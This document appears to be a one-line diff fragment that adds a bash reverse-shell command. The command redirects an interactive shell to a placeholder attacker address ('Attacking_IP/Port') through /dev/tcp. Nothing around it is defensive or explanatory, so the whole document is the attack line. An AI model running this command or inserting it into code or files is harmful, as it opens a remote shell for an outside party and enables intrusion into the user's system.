@@ -1,0 +1,1 @@
+bash -i > /dev/tcp/Attacking_IP/Port 0>&1
